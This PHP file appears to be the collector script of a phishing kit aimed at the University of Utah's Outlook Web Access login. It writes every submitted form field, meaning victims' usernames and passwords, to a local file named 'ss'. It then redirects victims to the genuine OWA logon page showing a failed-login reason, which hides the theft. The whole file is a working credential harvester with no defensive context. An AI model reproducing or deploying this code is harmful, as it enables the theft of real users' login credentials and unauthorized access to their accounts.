<?php
header ('Location:https://www.umail.utah.edu/owa/auth/logon.aspx?replaceCurrent=1&reason=2&url=https%3a%2f%2fwww.umail.utah.edu%2fowa');
$handle = fopen("ss", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 